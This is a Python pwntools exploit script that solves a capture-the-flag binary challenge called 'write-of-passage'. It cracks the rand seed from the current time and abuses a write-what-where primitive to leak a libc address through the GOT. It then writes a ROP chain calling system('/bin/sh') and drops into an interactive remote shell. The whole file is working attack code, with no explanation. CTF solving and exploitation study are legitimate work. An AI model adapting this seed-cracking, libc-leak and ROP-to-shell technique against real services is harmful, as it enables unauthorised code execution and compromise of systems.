#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL
from tqdm import tqdm

checksec= False

exe = ELF("./main_tmp_patched", checksec = checksec)
libc = ELF("./libc.so.6", checksec = checksec)
ld = ELF("./ld-linux-x86-64.so.2", checksec = checksec)

libc_time = CDLL(libc.path).time
libc_rand = CDLL(libc.path).rand
libc_srand = CDLL(libc.path).srand

HOST,PORT = "write-of-passage.hack.fe-ctf.dk", 1337

def conn():
  if args.REMOTE:
    r = remote(HOST, PORT)
  elif args.DBG:
    r = gdb.debug([exe.path], gdbscript=gdbscript)
  else:
    r = process([exe.path])
  return r

def what_where(type, offset):
  global r
  global libc_rand_calls
  libc_rand_calls += 1
  r.sendlineafter(b"What is it?\n",  f"{type}".encode(), timeout=2)
  r.sendlineafter(b"Where is it?\n", f"{offset}".encode(), timeout=2)

def loopyloop():
  global r
  global libc_rand_calls
  for _ in tqdm(range(0x500)):
    r = conn()
    time = libc_time(0)

    # For debugging we use a patched version of the binary.
    if args.REMOTE:
      what_where(AT_ENTRY, tests - start)

    try:
      # Interact again, and if we see the banner we have a loop!
      what_where(AT_ENTRY, banner_bytes - start)
      r.recvuntil(some_banner, timeout=2)
      
      return time
    except Exception as _:
      r.close()
      libc_rand_calls = 0
      continue
  
def crackycrack(time):
  global r

  # Obtain some random values
  rand_leaks = []
  
  libc_rand_calls_b4 = libc_rand_calls

  for i in range(3):
    what_where(AT_ENTRY, banner_bytes - start)
    rand_leaks.append(r.recvuntil(some_banner, timeout=2)[0])

  # Crack the seed using the rand values as tests
  brepr    = bin(time)[2:]
  bindices = [e for e,i in enumerate(brepr) if i == '0']
  
  for num in tqdm(range(2**len(bindices))):
    tmp = list(brepr)
    numbin = bin(num)[2:].rjust(len(bindices), '0')
    for e,j in enumerate(numbin):
      tmp[bindices[e]] = j

    test_seed = int(''.join(tmp), 2)

    libc_srand(test_seed)

    for _ in range(libc_rand_calls_b4):
      libc_rand()

    if all((libc_rand(test_seed) & 0xff) == i for i in rand_leaks):
      return test_seed
  return None

def writywrite(vals, what, where):
  global flag
  global r
  for e,v in enumerate(vals):
    cnt = 0
    while (libc_rand() & 0xff) != v: 
      cnt += 1  

    for _ in range(cnt):
      what_where(AT_ENTRY, banner_bytes - start)

    if flag:
      gdb.attach(r, gdbscript=gdbscript)

    what_where(what, where + e)

gdbscript=f'''
'''

AT_PHDR = 3
AT_ENTRY = 9
AT_BASE =	7 # ld
AT_RANDOM = 25

banner_bytes = exe.symbols['__compound_literal.0']
banner_ref = exe.symbols['banner']
start = exe.symbols['_start']
tests = exe.symbols['tests']

libc_rand_calls = 0

some_banner = b"\xe2\x96\x88\x20\x20\x20\x20\x20\xe2\x96\x88\xe2\x96\x91"

def main():
  global flag
  flag = False

  # Loop
  context.log_level = 'WARNING'
  time = loopyloop()
  context.log_level = 'INFO'
  log.info(f'Loop obtained')

  # Crack
  seed = crackycrack(time)
  if not seed:
    log.info(f"Seed cracking failed.")
    return 
  log.info(f"Found seed: {hex(seed)}")

  # Leak
  writywrite(p8(exe.got.puts & 0xff), AT_ENTRY, banner_ref - start)
  libc.address = u64(r.recvline(keepends=False).ljust(8, b'\0')) - libc.symbols['puts']
  log.info(f'libc: {hex(libc.address)}')

  # Rop
  # 0x000000000002792e: pop rdi; pop rbp; ret;
  pop_rdi_rbp_ret = libc.address+ 0x000000000002792e
  ret = b''
  ret += p64(pop_rdi_rbp_ret)
  ret += p64(next(libc.search(b"/bin/sh\0")))
  ret += b'A'*8 # For alignment.
  ret += p64(libc.symbols['system'])

  writywrite(ret, AT_RANDOM, -0xc61)

  # flag = True
  # Shell
  writywrite(b'\xc7', AT_ENTRY, tests - start)

  r.interactive()

if __name__ == "__main__":
  main()
